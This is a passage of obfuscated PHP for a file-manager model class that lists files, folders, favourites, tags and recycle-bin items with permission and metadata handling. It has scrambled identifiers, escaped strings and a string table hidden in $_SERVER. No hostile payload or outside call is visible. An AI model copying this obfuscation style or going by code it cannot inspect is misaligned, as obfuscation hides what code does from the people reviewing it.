unset($˜³˜Ü®Œ[$ËŞ¹ù•©[95]]); } return $this->where($˜³˜Ü®Œ)->delete(); } public function cacheSet($¥ì»ì†¬, $¼íò Û = false) { return Cache::set($this->cacheKey($¥ì»ì†¬), $¼íò Û); } public function cacheGet($ï¸Á¡œŸ) { return Cache::get($this->cacheKey($ï¸Á¡œŸ)); } public function cacheRemove($é’Ø¾Ûô) { return Cache::remove($this->cacheKey($é’Ø¾Ûô)); } protected function filterWhere($‰ŞŠ€¤¹) { return $‰ŞŠ€¤¹; } protected function cacheKey($¼ÒÚÌ Ù) { return $¼ÒÚÌ Ù; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\x63\145"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\155\145" => "\x69\x6f\x5f\x73\x6f\x75\x72\x63\145\137\155\x65\x74\141", "\x6d\145\164\141\106\151\145\x6c\x64" => "\x73\x6f\165\162\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\x69\155\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\x65\141\x74\145\x54\151\155\145", "\x74\x69\155\145", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\164\151\x6f\156"), array("\x76\x69\x65\167\x54\151\155\x65", "\x74\151\x6d\145", "\x69\156\163\145\162\x74", "\x66\165\x6e\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($£‡àÍñ) { return $this->listSource(array($_SERVER[® ¨Ä®ñ][393] => $£‡àÍñ)); } public function typeName($û«æˆ•) { static $÷¡ü ‡» = array(self::TYPE_SYSTEM => "\x73\171\163\x74\x65\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $÷¡ü ‡»[$û«æˆ• . $_SERVER[® ¨Ä®ñ][12]]; } public function sourceListInfo($‰ğ’‚û¬, $ü¥«“ŠÈ = false) { $—µÒ‘µ =& $_SERVER[® ¨Ä®ñ]; $‰ğ’‚û¬ = $‰ğ’‚û¬ ? $‰ğ’‚û¬ : array(); $‰ğ’‚û¬ = array_filter(array_unique($‰ğ’‚û¬)); if (!$‰ğ’‚û¬) { return array(); } $òŒ•¤¤Ï = $this->where(array($—µÒ‘µ[394] => array($—µÒ‘µ[7], $‰ğ’‚û¬)))->select(); $this->_listDataApply($òŒ•¤¤Ï, $ü¥«“ŠÈ); return array_to_keyvalue($òŒ•¤¤Ï, $—µÒ‘µ[394]); } public function pathInfoFilter(&$¿æˆ’çå) { $ùµŸï¦ =& $_SERVER[® ¨Ä®ñ]; static $öí´œ’Ø = false; static $Á®‹Ğ¤ä = false; static $‚‚ÔôŞŠ = false; if (!$öí´œ’Ø) { $ôÅÜ = $ùµŸï¦[395]; $ôÅÜ .= $ùµŸï¦[396]; $ôÅÜ .= $ùµŸï¦[397]; $˜÷²™ı = $ùµŸï¦[398]; $¯´àğâ  = explode($ùµŸï¦[50], $˜÷²™ı); $öí´œ’Ø = explode($ùµŸï¦[50], $ôÅÜ); $Á®‹Ğ¤ä = array(); foreach ($öí´œ’Ø as $¦®Ö¶î) { if (in_array($¦®Ö¶î, $¯´àğâ )) { continue; } $Á®‹Ğ¤ä[] = $¦®Ö¶î; } $‚‚ÔôŞŠ = explode($ùµŸï¦[50], $ùµŸï¦[399]); } foreach ($‚‚ÔôŞŠ as $½Ù÷ºø•) { if (isset($¿æˆ’çå[$½Ù÷ºø•])) { $¿æˆ’çå[$½Ù÷ºø•] = intval($¿æˆ’çå[$½Ù÷ºø•]); } } $¿æˆ’çå[$ùµŸï¦[78]] = $ùµŸï¦[400] . $¿æˆ’çå[$ùµŸï¦[394]] . $ùµŸï¦[401]; $¿æˆ’çå[$ùµŸï¦[33]] = $¿æˆ’çå[$ùµŸï¦[402]] == 1 ? $ùµŸï¦[79] : $ùµŸï¦[192]; $¿æˆ’çå[$ùµŸï¦[403]] = $this->typeName($¿æˆ’çå[$ùµŸï¦[403]]); if ($¿æˆ’çå[$ùµŸï¦[402]] != 1) { $¿æˆ’çå[$ùµŸï¦[167]] = $¿æˆ’çå[$ùµŸï¦[404]]; unset($¿æˆ’çå[$ùµŸï¦[404]]); } $ì·ĞÙŸ = $öí´œ’Ø; if (isset($¿æˆ’çå[$ùµŸï¦[405]]) && $¿æˆ’çå[$ùµŸï¦[405]][$ùµŸï¦[406]] == -1) { $ì·ĞÙŸ = $Á®‹Ğ¤ä; } $¿æˆ’çå = array_field_key($¿æˆ’çå, $ì·ĞÙŸ); return $¿æˆ’çå; } public function listUserFav() { $£ĞóÄ’ =& $_SERVER[® ¨Ä®ñ]; $¸ı‡ì = Model($£ĞóÄ’[407])->listData(); $ÍÑöŸ”½ = array_filter_by_field($¸ı‡ì, $£ĞóÄ’[33], $£ĞóÄ’[408]); $ÍÑöŸ”½ = array_to_keyvalue($ÍÑöŸ”½, $£ĞóÄ’[12], $£ĞóÄ’[78]); if ($ÍÑöŸ”½) { $•Ğ¼Õñ = $this->listSource(array($£ĞóÄ’[409] => array($£ĞóÄ’[410], $ÍÑöŸ”½))); } $•Ğ¼Õñ = array_to_keyvalue($•Ğ¼Õñ[$£ĞóÄ’[364]], $£ĞóÄ’[394]); foreach ($¸ı‡ì as &$ƒ üÎí) { $ƒ üÎí = array($£ĞóÄ’[411] => $ƒ üÎí[$£ĞóÄ’[392]], $£ĞóÄ’[412] => $ƒ üÎí[$£ĞóÄ’[32]], $£ĞóÄ’[413] => $ƒ üÎí[$£ĞóÄ’[78]], $£ĞóÄ’[414] => $ƒ üÎí[$£ĞóÄ’[33]], $£ĞóÄ’[415] => $ƒ üÎí[$£ĞóÄ’[193]], $£ĞóÄ’[416] => $ƒ üÎí[$£ĞóÄ’[86]]); if ($ƒ üÎí[$£ĞóÄ’[33]] == $£ĞóÄ’[408] && $•Ğ¼Õñ[$ƒ üÎí[$£ĞóÄ’[78]]]) { $ƒ üÎí[$£ĞóÄ’[87]] = $•Ğ¼Õñ[$ƒ üÎí[$£ĞóÄ’[78]]]; } } unset($ƒ üÎí); return $¸ı‡ì; } public function listUserTag($®ÑÎÒåö) { $¥í ¾• =& $_SERVER[® ¨Ä®ñ]; if ($®ÑÎÒåö && !is_array($®ÑÎÒåö)) { $®ÑÎÒåö = array($®ÑÎÒåö); } $¦ı‰§‹ø = Model($¥í ¾•[417])->listData(); $ÖíÈÃ­Ô = array(); foreach ($¦ı‰§‹ø as $•‘Ì½êë) { $É’üÌŠÎ = $•‘Ì½êë[$¥í ¾•[78]]; if (!$É’üÌŠÎ) { continue; } if (!isset($ÖíÈÃ­Ô[$É’üÌŠÎ])) { $ÖíÈÃ­Ô[$É’üÌŠÎ] = array(); } $ÖíÈÃ­Ô[$É’üÌŠÎ][] = $•‘Ì½êë[$¥í ¾•[418]]; } $»şŞÆ”Ç = array(); foreach ($ÖíÈÃ­Ô as $µİ §Ê­ => $¯³ŒŒÔÙ) { $İ¼îãŸ” = !0; if (!$®ÑÎÒåö) { $»şŞÆ”Ç[] = $µİ §Ê­; continue; } foreach ($®ÑÎÒåö as $ìÔ‘İÁ÷) { if (!in_array($ìÔ‘İÁ÷, $¯³ŒŒÔÙ)) { $İ¼îãŸ” = !1; break; } } if ($İ¼îãŸ”) { $»şŞÆ”Ç[] = $µİ §Ê­; } } if (!$»şŞÆ”Ç) { return array(); } $«Ãá½Ç¾ = $this->listSource(array($¥í ¾•[409] => array($¥í ¾•[410], $»şŞÆ”Ç))); if (!$«Ãá½Ç¾ || count($»şŞÆ”Ç) == $«Ãá½Ç¾[$¥í ¾•[361]][$¥í ¾•[362]]) { return $«Ãá½Ç¾; } $ë…Ğ™µ” = array(); $Ï£´àã = array_to_keyvalue($«Ãá½Ç¾[$¥í ¾•[77]], $¥í ¾•[12], $¥í ¾•[394]); $œ‘ñ¤µ÷ = array_to_keyvalue($«Ãá½Ç¾[$¥í ¾•[76]], $¥í ¾•[12], $¥í ¾•[394]); $™öşÍå¸ = array_merge($œ‘ñ¤µ÷, $Ï£´àã); foreach ($»şŞÆ”Ç as $É’üÌŠÎ) { if (!in_array($É’üÌŠÎ, $™öşÍå¸)) { $ë…Ğ™µ”[] = $É’üÌŠÎ; } } if ($ë…Ğ™µ”) { Model($¥í ¾•[419])->removeBySource($ë…Ğ™µ”); } return $«Ãá½Ç¾; } public function listUserRecycle() { $ô»È¸ŸÂ =& $_SERVER[® ¨Ä®ñ]; $ß„ÈÜÌ  = Model($ô»È¸ŸÂ[420])->listData(); if (!$ß„ÈÜÌ ) { return array(); } $ñƒ·Êî… = array($ô»È¸ŸÂ[409] => array($ô»È¸ŸÂ[410], $ß„ÈÜÌ ), $ô»È¸ŸÂ[421] => 1); return $this->listSource($ñƒ·Êî…); } public function listSource($µş¦™Š, $«€ÁòÙ¤ = 3000) { $°ãÖ©ªô =& $_SERVER[® ¨Ä®ñ]; if (!isset($µş¦™Š[$°ãÖ©ªô[422]])) { $µş¦™Š[$°ãÖ©ªô[422]] = 0; } $îƒ¾ß”¼ = $°ãÖ©ªô[423]; $åù¸±¶à = $this->field($îƒ¾ß”¼)->_makeOrder()->where($µş¦™Š)->selectPage($«€ÁòÙ¤); $this->_listPageCheck($åù¸±¶à, $îƒ¾ß”¼, $µş¦™Š); $this->_listDataApply($åù¸±¶à[$°ãÖ©ªô[364]]); $this->_listMake($åù¸±¶à); return $åù¸±¶à; } private function _listPageCheck(&$Ş¦ÑÜ‰˜, $«Åô×, $øÅı¾„) { $¯àˆ²ø³ =& $_SERVER[® ¨Ä®ñ]; if (!is_array($Ş¦ÑÜ‰˜[$¯àˆ²ø³[361]])) { return; } $øëËÉĞñ = $Ş¦ÑÜ‰˜[$¯àˆ²ø³[361]]; if ($øëËÉĞñ[$¯àˆ²ø³[363]] <= 1) { return; } if ($øëËÉĞñ[$¯àˆ²ø³[362]] >= 100000) { return; } if (Model($¯àˆ²ø³[424])->get($¯àˆ²ø³[425]) != $¯àˆ²ø³[426]) { return; } $«Åô× = str_replace(array($¯àˆ²ø³[53], $¯àˆ²ø³[337], $¯àˆ²ø³[226]), $¯àˆ²ø³[12], $«Åô×); $«Åô× = $¯àˆ²ø³[427] . str_replace($¯àˆ²ø³[50], $¯àˆ²ø³[428], $«Åô×) . $¯àˆ²ø³[429]; $À¾ë£ñÜ = $¯àˆ²ø³[430]; $À¾ë£ñÜ = $À¾ë£ñÜ . $¯àˆ²ø³[431]; $ÖÄë©ƒ’ = $øëËÉĞñ[$¯àˆ²ø³[358]] * ($øëËÉĞñ[$¯àˆ²ø³[348]] - 1) . $¯àˆ²ø³[50] . $øëËÉĞñ[$¯àˆ²ø³[358]]; $İÇ•ïà = $this->_makeOrder(!0); $ç¹±É¦ = $¯àˆ²ø³[427] . str_replace($¯àˆ²ø³[50], $¯àˆ²ø³[428], $İÇ•ïà[0]); if (strpos($ç¹±É¦, $¯àˆ²ø³[432])) { $ç¹±É¦ = str_replace($¯àˆ²ø³[432], $¯àˆ²ø³[433], $ç¹±É¦); } else { $ç¹±É¦ .= $¯àˆ²ø³[434] . $İÇ•ïà[1]; } $ÊÜúşé = array(); foreach ($øÅı¾„ as $àŞÙ«’– => $Ùâ˜†İß) { $ÊÜúşé[$¯àˆ²ø³[427] . $àŞÙ«’–] = $Ùâ˜†İß; } $this->alias($¯àˆ²ø³[435])->field($«Åô×)->limit($ÖÄë©ƒ’)->order($ç¹±É¦); $Ò™Õèç‚ = $this->join($À¾ë£ñÜ)->where($ÊÜúşé)->select(); if ($Ò™Õèç‚) { $Ş¦ÑÜ‰˜[$¯àˆ²ø³[364]] = $Ò™Õèç‚; } } protected function _makeOrder($£€ğŸ…İ = false) { $ÜÎìŒëœ =& $_SERVER[® ¨Ä®ñ]; $ÚîŠ¨Ë = Model($ÜÎìŒëœ[436])->get($ÜÎìŒëœ[437]); $Ó‰”ß© = Model($ÜÎìŒëœ[436])->get($ÜÎìŒëœ[438]); $ĞÂóí¥‹ = array($ÜÎìŒëœ[439] => $ÜÎìŒëœ[440], $ÜÎìŒëœ[441] => $ÜÎìŒëœ[442]); $ûö§¼ = array($ÜÎìŒëœ[32] => $ÜÎìŒëœ[32], $ÜÎìŒëœ[80] => $ÜÎìŒëœ[80], $ÜÎìŒëœ[167] => $ÜÎìŒëœ[404], $ÜÎìŒëœ[443] => $ÜÎìŒëœ[443], $ÜÎìŒëœ[444] => $ÜÎìŒëœ[445], $ÜÎìŒëœ[193] => $ÜÎìŒëœ[193], $ÜÎìŒëœ[86] => $ÜÎìŒëœ[86]); $¿’¸¶„ = Input::get($ÜÎìŒëœ[446], $ÜÎìŒëœ[7], $ÚîŠ¨Ë, array_keys($ûö§¼)); $¤å£Š€ = Input::get($ÜÎìŒëœ[447], $ÜÎìŒëœ[7], $Ó‰”ß©, array_keys($ĞÂóí¥‹)); if (!in_array($¿’¸¶„, array_keys($ûö§¼))) { $¿’¸¶„ = $ÜÎìŒëœ[32]; } if (!in_array($¤å£Š€, array_keys($ĞÂóí¥‹))) { $¿’¸¶„ = $ÜÎìŒëœ[439]; } if ($¿’¸¶„ == $ÜÎìŒëœ[32]) { } $¾¶øµâ’ = $ÜÎìŒëœ[448] . $ûö§¼[$¿’¸¶„] . $ÜÎìŒëœ[53] . $ĞÂóí¥‹[$¤å£Š€]; $¾¶øµâ’ = rtrim(trim($¾¶øµâ’), $ÜÎìŒëœ[50]); if ($£€ğŸ…İ) { return array($¾¶øµâ’, $ĞÂóí¥‹[$¤å£Š€]); } return $this->order($¾¶øµâ’); } protected function _listDataApplyItem($ªÄ¡’€æ, $öŞÙË‰ = false) { $µ¿¶¥Ä¼ = array($ªÄ¡’€æ); $this->_listDataApply($µ¿¶¥Ä¼, $öŞÙË‰); return $µ¿¶¥Ä¼[0]; } protected function _listDataApply(&$°ş¼†ë, $îÒ…Ğ®‘ = false) { $ó“ÏïŞ¤ =& $_SERVER[® ¨Ä®ñ]; if (!$°ş¼†ë) { $°ş¼†ë = array(); return; } $ùèœ„ = array_to_keyvalue($°ş¼†ë, $ó“ÏïŞ¤[12], $ó“ÏïŞ¤[394]); $ùèœ„ = array_unique($ùèœ„); $this->_listSourceCache($°ş¼†ë); if (!$îÒ…Ğ®‘) { $this->_listAppendMeta($°ş¼†ë, $ùèœ„); $this->_listAppendFileMeta($°ş¼†ë, $ùèœ„); $this->_listAppendChildren($°ş¼†ë, $ùèœ„); } $this->_listAppendPath($°ş¼†ë); $this->_listAppendAuth($°ş¼†ë); $this->_listAppendSourceInfo($°ş¼†ë, $ùèœ„); $this->_listAppendUser($°ş¼†ë); $this->_listFilterInfo($°ş¼†ë, $îÒ…Ğ®‘); $this->_listAppendAuthSecret($°ş¼†ë); } protected function _listSourceCache($ÖÁ‡â¸Ñ) { $Á”âé¾à =& $_SERVER[® ¨Ä®ñ]; foreach ($ÖÁ‡â¸Ñ as $“ùÓ¨ş«) { self::$cacheSourceInfo[$Á”âé¾à[449] . $“ùÓ¨ş«[$Á”âé¾à[394]]] = $“ùÓ¨ş«; } } protected function _listFilterInfo(&$Ú²˜ñ’ú, $ßîÖ¹‰Ø = false) { $ÀÀõå§ =& $_SERVER[® ¨Ä®ñ]; foreach ($Ú²˜ñ’ú as &$«°ÍŞë) { $«°ÍŞë = $this->pathInfoFilter($«°ÍŞë); self::$cachePathInfo[$ÀÀõå§[450] . intval($ßîÖ¹‰Ø) . $ÀÀõå§[451] . $«°ÍŞë[$ÀÀõå§[394]]] = $«°ÍŞë; } unset($«°ÍŞë); } protected function _listMake(&$—¶ÖÈ™Á) { $·‚—øÜ¦ =& $_SERVER[® ¨Ä®ñ]; $—¶ÖÈ™Á[$·‚—øÜ¦[77]] = array(); $—¶ÖÈ™Á[$·‚—øÜ¦[76]] = array(); foreach ($—¶ÖÈ™Á[$·‚—øÜ¦[364]] as $“ÏË €¹) { $ÃÑâŸÆº = $“ÏË €¹[$·‚—øÜ¦[402]] == 1 ? $·‚—øÜ¦[77] : $·‚—øÜ¦[76]; $—¶ÖÈ™Á[$ÃÑâŸÆº][] = $“ÏË €¹; } unset($—¶ÖÈ™Á[$·‚—øÜ¦[364]]); } protected function _listAppendMeta(&$ë™¹¢“ù, $µÂ‚„–õ) { $ş©ÚÃ§ş =& $_SERVER[® ¨Ä®ñ]; $š“Šü‹ = array($ş©ÚÃ§ş[409] => array($ş©ÚÃ§ş[410], $µÂ‚„–õ)); $’Ÿß¢ıÄ = Model($ş©ÚÃ§ş[452])->field($ş©ÚÃ§ş[453])->where($š“Šü‹)->select(); if (!$’Ÿß¢ıÄ) { return; } $³’ù‘ = array($ş©ÚÃ§ş[454], $ş©ÚÃ§ş[455], $ş©ÚÃ§ş[433]); $ÈÇÔğè´ = array(); foreach ($’Ÿß¢ıÄ as $Ì¿‘­¶ü) { if (!isset($ÈÇÔğè´[$Ì¿‘­¶ü[$ş©ÚÃ§ş[394]]])) { $ÈÇÔğè´[$Ì¿‘­¶ü[$ş©ÚÃ§ş[394]]] = array(); } if (in_array($Ì¿‘­¶ü[$ş©ÚÃ§ş[95]], $³’ù‘)) { continue; } $ÈÇÔğè´[$Ì¿‘­¶ü[$ş©ÚÃ§ş[394]]][$Ì¿‘­¶ü[$ş©ÚÃ§ş[95]]] = $Ì¿‘­¶ü[$ş©ÚÃ§ş[369]]; } foreach ($ë™¹¢“ù as &$Â¯“«½‘) { $Â¯“«½‘[$ş©ÚÃ§ş[456]] = !1; if (isset($ÈÇÔğè´[$Â¯“«½‘[$ş©ÚÃ§ş[394]]])) { $Â¯“«½‘[$ş©ÚÃ§ş[456]] = $ÈÇÔğè´[$Â¯“«½‘[$ş©ÚÃ§ş[394]]]; } if ($this->fileIsLock($Â¯“«½‘) && $Â¯“«½‘[$ş©ÚÃ§ş[405]]) { $´¾Ú©² = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Â¯“«½‘[$ş©ÚÃ§ş[405]][$ş©ÚÃ§ş[406]] = AuthModel::authDisable($Â¯“«½‘[$ş©ÚÃ§ş[405]][$ş©ÚÃ§ş[406]], $´¾Ú©²); $Â¯“«½‘[$ş©ÚÃ§ş[405]][$ş©ÚÃ§ş[457]][$ş©ÚÃ§ş[405]] = $Â¯“«½‘[$ş©ÚÃ§ş[405]][$ş©ÚÃ§ş[406]]; } } unset($Â¯“«½‘); } protected function _listAppendFileMeta(&$‹ğ»§Ñ, $ö«è»º ) { $åóæºå =& $_SERVER[® ¨Ä®ñ]; $ÚÇ…´Ğ“ = array_to_keyvalue($‹ğ»§Ñ, $åóæºå[12], $åóæºå[458]); $ÚÇ…´Ğ“ = array_filter(array_unique($ÚÇ…´Ğ“)); if (!$ÚÇ…´Ğ“) { return; } $±­æ€„Ò = array($åóæºå[459] => array($åóæºå[410], $ÚÇ…´Ğ“)); $¥¹Ú“×­ = $åóæºå[460]; $Ò²±ÙÄ = Model($åóæºå[461])->field($¥¹Ú“×­)->where($±­æ€„Ò)->select(); $Ò²±ÙÄ = array_to_keyvalue($Ò²±ÙÄ, $åóæºå[458]); $¯—„û’ƒ = Model($åóæºå[462])->field($åóæºå[463])->where($±­æ€„Ò)->select(); $¯—„û’ƒ = $¯—„û’ƒ ? $¯—„û’ƒ : array(); $ÂÄ×Šâ‹ = array(); foreach ($¯—„û’ƒ as $íÜ‹²İú) { if (!isset($ÂÄ×Šâ‹[$íÜ‹²İú[$åóæºå[458]]])) { $ÂÄ×Šâ‹[$íÜ‹²İú[$åóæºå[458]]] = array(); } $ÂÄ×Šâ‹[$íÜ‹²İú[$åóæºå[458]]][$íÜ‹²İú[$åóæºå[95]]] = $íÜ‹²İú[$åóæºå[369]]; } foreach ($‹ğ»§Ñ as &$ğµï¸) { $ï‘‹ì = $ğµï¸[$åóæºå[458]]; if (!$ï‘‹ì || !is_array($Ò²±ÙÄ[$ï‘‹ì])) { continue; } $º³±¡ê¢ = $Ò²±ÙÄ[$ï‘‹ì]; $º³±¡ê¢[$åóæºå[80]] = $ğµï¸[$åóæºå[80]]; $º³±¡ê¢[$åóæºå[32]] = $ğµï¸[$åóæºå[32]]; if (!isset(self::$cacheFileInfo[$åóæºå[464] . $ï‘‹ì])) { self::$cacheFileInfo[$åóæºå[464] . $ï‘‹ì] = array_merge(array(), $º³±¡ê¢); } unset($Ò²±ÙÄ[$ï‘‹ì][$åóæºå[78]]); $éŞ•âÉ“ = is_array($ÂÄ×Šâ‹[$ï‘‹ì]) ? $ÂÄ×Šâ‹[$ï‘‹ì] : array(); $ğµï¸[$åóæºå[163]] = array_merge($éŞ•âÉ“, $Ò²±ÙÄ[$ï‘‹ì]); if (isset($ğµï¸[$åóæºå[163]][$åóæºå[162]])) { $ğµï¸[$åóæºå[162]] = json_decode($ğµï¸[$åóæºå[163]][$åóæºå[162]], !0); unset($ğµï¸[$åóæºå[163]][$åóæºå[162]]); } } unset($ğµï¸); } protected function _listAppendSourceInfo(&$¦‘Ñ, $òÃ­ÙÂó) { $ÈŒŠ‰ÚÁ =& $_SERVER[® ¨Ä®ñ]; if (!defined($ÈŒŠ‰ÚÁ[465])) { return; } $Í¬å‰ = Model($ÈŒŠ‰ÚÁ[466])->listData(); $õ‹¨ = Model($ÈŒŠ‰ÚÁ[417])->listData(); $åÕç‡ƒ = Model($ÈŒŠ‰ÚÁ[407])->listData(); $ïÒ€ƒÒÑ = Model($ÈŒŠ‰ÚÁ[467])->listSimple(); $Â„ù‘¾ = array_to_keyvalue($Í¬å‰, $ÈŒŠ‰ÚÁ[392]); $Şçä¸Ù‡ = array_to_keyvalue_group($õ‹¨, $ÈŒŠ‰ÚÁ[78], $ÈŒŠ‰ÚÁ[418]); $†—€ÉÌÈ = array_to_keyvalue($åÕç‡ƒ, $ÈŒŠ‰ÚÁ[78]); $üìµæÁÕ = array_to_keyvalue_group($ïÒ€ƒÒÑ, $ÈŒŠ‰ÚÁ[394]); foreach ($¦‘Ñ as &$›¡—Á) { $›¡—Á[$ÈŒŠ‰ÚÁ[87]] = array($ÈŒŠ‰ÚÁ[468] => 0, $ÈŒŠ‰ÚÁ[469] => 0, $ÈŒŠ‰ÚÁ[470] => 0); if (isset($†—€ÉÌÈ[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]])) { $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[471]] = 1; $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[472]] = $†—€ÉÌÈ[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]][$ÈŒŠ‰ÚÁ[32]]; } if (isset($Şçä¸Ù‡[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]])) { $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[473]] = array(); foreach ($Şçä¸Ù‡[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]] as $½â±ìØñ) { $ÅÅ×ÔìÇ = $Â„ù‘¾[$½â±ìØñ]; $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[473]][] = array($ÈŒŠ‰ÚÁ[474] => $ÅÅ×ÔìÇ[$ÈŒŠ‰ÚÁ[392]], $ÈŒŠ‰ÚÁ[412] => $ÅÅ×ÔìÇ[$ÈŒŠ‰ÚÁ[32]], $ÈŒŠ‰ÚÁ[475] => $ÅÅ×ÔìÇ[$ÈŒŠ‰ÚÁ[476]]); } } if (isset($üìµæÁÕ[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]])) { $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[477]] = array(); foreach ($üìµæÁÕ[$›¡—Á[$ÈŒŠ‰ÚÁ[394]]] as $ÁÜ’ê¿®) { $›¡—Á[$ÈŒŠ‰ÚÁ[87]][$ÈŒŠ‰ÚÁ[477]] = array($ÈŒŠ‰ÚÁ[478] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[479]], $ÈŒŠ‰ÚÁ[480] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[481]], $ÈŒŠ‰ÚÁ[482] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[394]], $ÈŒŠ‰ÚÁ[483] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[484]], $ÈŒŠ‰ÚÁ[485] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[486]], $ÈŒŠ‰ÚÁ[487] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[487]], $ÈŒŠ‰ÚÁ[488] => $ÁÜ’ê¿®[$ÈŒŠ‰ÚÁ[488]]); } } } unset($›¡—Á); return $¦‘Ñ; } protected function _listAppendChildren(&$ÙŞË²“¾, $€Îüìûâ) { $î¿¶à› =& $_SERVER[® ¨Ä®ñ]; $¤å¶à÷ü = array(); $úœçŸå˜ = array($î¿¶à›[202] => 0, $î¿¶à›[203] => 0); foreach ($ÙŞË²“¾ as &$éÀ…ÂÍ) { if (!$éÀ…ÂÍ[$î¿¶à›[402]]) { continue; } $¤å¶à÷ü[] = $éÀ…ÂÍ[$î¿¶à›[394]]; } unset($éÀ…ÂÍ); if (!$¤å¶à÷ü) { return; } $ûœã—¶ƒ = array($î¿¶à›[489] => array($î¿¶à›[7], $¤å¶à÷ü)); $îòÊ ’ = array($î¿¶à›[489], $î¿¶à›[402], $î¿¶à›[490] => $î¿¶à›[491]); $“úœĞª® = $this->field($îòÊ ’)->where($ûœã—¶ƒ)->group($î¿¶à›[492])->select(); $†¿şûî° = array(); foreach ($“úœĞª® as $ş›ùú¢º) { $–¿Ô™ıÏ = $ş›ùú¢º[$î¿¶à›[489]]; $Å·°®½ = $ş›ùú¢º[$î¿¶à›[402]] == $î¿¶à›[89] ? $î¿¶à›[203] : $î¿¶à›[202]; if (!isset($†¿şûî°[$–¿Ô™ıÏ])) { $†¿şûî°[$–¿Ô™ıÏ] = array($î¿¶à›[202] => 0, $î¿¶à›[203] => 0); } $†¿şûî°[$–¿Ô™ıÏ][$Å·°®½] += $ş›ùú¢º[$î¿¶à›[491]]; } foreach ($ÙŞË²“¾ as &$éÀ…ÂÍ) { if (!$éÀ…ÂÍ[$î¿¶à›[402]]) { continue; } $‰®ºÃÜ = is_array($†¿şûî°[$éÀ…ÂÍ[$î¿¶à›[394]]]) ? $†¿şûî°[$éÀ…ÂÍ[$î¿¶à›[394]]] : $úœçŸå˜; $éÀ…ÂÍ[$î¿¶à›[203]] = $‰®ºÃÜ[$î¿¶à›[203]]; $éÀ…ÂÍ[$î¿¶à›[202]] = $‰®ºÃÜ[$î¿¶à›[202]]; unset($éÀ…ÂÍ[$î¿¶à›[404]]); } unset($éÀ…ÂÍ); } protected function _listAppendAuth(&$Ş­·îşã) { $¸¤†®…ü =& $_SERVER[® ¨Ä®ñ]; if (!defined($¸¤†®…ü[465])) { return; } $ß¨åûĞô = array(); foreach ($Ş­·îşã as $Ş¼“ ”) { if ($Ş¼“ ”[$¸¤†®…ü[403]] == self::TYPE_GROUP) { $ß¨åûĞô[] = $Ş¼“ ”[$¸¤†®…ü[394]]; } } if (!$ß¨åûĞô) { return; } $ÂÄÍœ» = array_to_keyvalue($Ş­·îşã, $¸¤†®…ü[394]); $ã£°”«ú = Model($¸¤†®…ü[493])->getSourceList($ß¨åûĞô, $ÂÄÍœ»); foreach ($Ş­·îşã as $Ò¥Ú†³’ => &$Ş¼“ ”) { $Ş¼“ ”[$¸¤†®…ü[405]] = $ã£°”«ú[$Ş¼“ ”[$¸¤†®…ü[394]]]; if (!$Ş¼“ ”[$¸¤†®…ü[405]] && $Ş¼“ ”[$¸¤†®…ü[403]] == self::TYPE_GROUP) { $Ş¼“ ”[$¸¤†®…ü[405]] = Action($¸¤†®…ü[494])->pathGroupAuthMake($Ş¼“ ”[$¸¤†®…ü[495]]); if (!$Ş¼“ ”[$¸¤†®…ü[405]] && !_get($GLOBALS, $¸¤†®…ü[496])) { $Ş¼“ ”[$¸¤†®…ü[195]] = !1; $Ş¼“ ”[$¸¤†®…ü[194]] = !1; } } if ($Ş¼“ ”[$¸¤†®…ü[405]]) { $Ş¼“ ”[$¸¤†®…ü[195]] = AuthModel::authCheckEdit($Ş¼“ ”[$¸¤†®…ü[405]][$¸¤†®…ü[406]]); $Ş¼“ ”[$¸¤†®…ü[194]] = AuthModel::authCheckView($Ş¼“ ”[$¸¤†®…ü[405]][$¸¤†®…ü[406]]); } $this->groupPathDisplay($Ş¼“ ”); } unset($Ş¼“ ”); } public function _listAppendAuthSecret(&$¦¡¡Îª¾) { $Èó’±¥Ù =& $_SERVER[® ¨Ä®ñ]; if (Model($Èó’±¥Ù[424])->get($Èó’±¥Ù[497]) != $Èó’±¥Ù[89]) { return; } static $ó¡·Ó™Ä = false; if (!$ó¡·Ó™Ä) { $ùìêË€ = Model($Èó’±¥Ù[498]); $©Î¦«¥ì = Model($Èó’±¥Ù[499]); $ó¡·Ó™Ä = $©Î¦«¥ì->listData(); $ó¡·Ó™Ä = array_to_keyvalue($ó¡·Ó™Ä, $Èó’±¥Ù[394]); $ú£“«ù = json_decode(Model($Èó’±¥Ù[424])->get($Èó’±¥Ù[500]), !0); $ú£“«ù = array_to_keyvalue($ú£“«ù, $Èó’±¥Ù[392]); foreach ($ó¡·Ó™Ä as $öÙê­ğ => $í„†Õí) { $ú‰¼ˆ¾“ = $ú£“«ù[$í„†Õí[$Èó’±¥Ù[501]]]; if (!$ú‰¼ˆ¾“) { $©Î¦«¥ì->remove($í„†Õí[$Èó’±¥Ù[392]]); 